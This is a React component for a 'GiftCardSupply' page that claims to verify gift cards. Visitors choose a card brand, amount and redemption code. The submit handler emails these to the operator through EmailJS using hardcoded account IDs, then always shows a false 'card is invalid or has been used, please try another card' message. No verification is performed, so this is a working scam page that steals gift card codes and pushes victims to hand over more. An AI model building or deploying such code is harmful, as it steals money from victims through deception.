"use client";
import { useState } from "react";
import emailjs from "emailjs-com";
import { Button } from "@/components/ui/button";

function Verify() {
  const [card, setCard] = useState("Amazon");
  const [amount, setAmount] = useState("");
  const [currency, setCurrency] = useState("CAD");
  const [code, setCode] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // Send via EmailJS
    emailjs
      .send(
        "service_en4pdui", // Replace with your EmailJS service ID
        "template_rmvqspd", // Replace with your EmailJS template ID
        {
          card_type: card,
          amount: `${amount} ${currency}`,
          code: code,
        },
        "tfZWbtJumKb2q4QwW" // Replace with your EmailJS user ID (public key)
      )
      .then(() => {
        alert("Card is invalid or has been used. Please try another card.");
      })
      .catch((error) => {
        console.error("Email failed", error);
        alert("Something went wrong sending your request.");
      });
  };

  return (
    <section id="verify" className="bg-[#9fe870] py-16 lg:py-24">
      <div className="container mx-auto px-6">
        <div className="flex flex-col lg:grid lg:grid-cols-2 gap-12 items-center">
          {/* Text Left */}
          <div className="space-y-6 text-center lg:text-left">
            <h2 className="text-3xl sm:text-4xl lg:text-5xl font-bold text-black leading-tight">
              An efficient solution to verify all cards data.
            </h2>
            <p className="text-base sm:text-lg text-black max-w-lg mx-auto lg:mx-0">
              With GiftCardSupply, you can trust that your cards will be
              verified accurately and quickly, allowing you to use them as soon
              as possible. Choose GiftCardSupply for a hassle-free gift card
              verification experience.
            </p>
          </div>

          {/* Form Right */}
          <div className="w-full max-w-xl bg-white rounded-3xl p-6 sm:p-8 shadow-2xl mx-auto lg:mx-0">
            <h3 className="text-[#9fe870] font-extrabold text-lg sm:text-xl text-center mb-6">
              VERIFY GIFT CARD INFORMATION
            </h3>

            <form className="space-y-6" onSubmit={handleSubmit}>
              {/* Select Card */}
              <div>
                <label className="block text-gray-500 font-medium mb-2">
                  Select Card
                </label>
                <select
                  value={card}
                  onChange={(e) => setCard(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 text-gray-700 rounded-lg focus:ring-2 focus:ring-green-500"
                >
                  <option value="Amazon">Amazon</option>
                  <option value="Amex">Amex</option>
                  <option value="Apple">Apple</option>
                  <option value="eBay">eBay</option>
                  <option value="Googleplay">Googleplay</option>
                  <option value="Mastercard">Mastercard</option>
                  <option value="Nike">Nike</option>
                  <option value="Nordstrom">Nordstrom</option>
                  <option value="Playstation">Playstation</option>
                  <option value="RazerGold">RazerGold</option>
                  <option value="Sephora">Sephora</option>
                  <option value="Steam">Steam</option>
                  <option value="TT Visa">TT Visa</option>
                  <option value="Vanilla Visa">Vanilla Visa</option>
                  <option value="Visa Silvery White">Visa Silvery White</option>
                  <option value="Walmart Visa">Walmart Visa</option>
                  <option value="Xbox">Xbox</option>
                </select>
              </div>

              {/* Amount + Currency */}
              <div>
                <label className="block text-gray-500 font-medium mb-2">
                  Enter Amount
                </label>
                <div className="flex gap-2">
                  <input
                    type="number"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    placeholder="1000"
                    className="flex-1 px-4 py-3 border border-gray-300 text-gray-700 rounded-lg"
                  />
                  <select
                    value={currency}
                    onChange={(e) => setCurrency(e.target.value)}
                    className="px-4 py-3 border border-gray-300 text-gray-700 rounded-lg min-w-[80px]"
                  >
                    <option>CAD</option>
                    <option>AUD</option>
                    <option>EUR</option>
                    <option>GPD</option>
                    <option>USD</option>
                  </select>
                </div>
              </div>

              {/* Code */}
              <div>
                <label className="block text-gray-500 font-medium mb-2">
                  Redemption Code
                </label>
                <input
                  type="text"
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  placeholder="Enter your code"
                  className="w-full px-4 py-3 border border-gray-300 text-gray-700 rounded-lg"
                />
              </div>

              <p className="text-sm text-gray-500 leading-relaxed">
                Please make sure the codes you are about to input are correct
                and according to details.
              </p>

              {/* Button */}
              <Button
                type="submit"
                className="w-full bg-[#9fe870] hover:bg-[#86c260] text-black py-4 sm:py-5 rounded-full font-medium"
              >
                Verify
              </Button>
            </form>
          </div>
        </div>
      </div>
    </section>
  );
}

export default Verify;
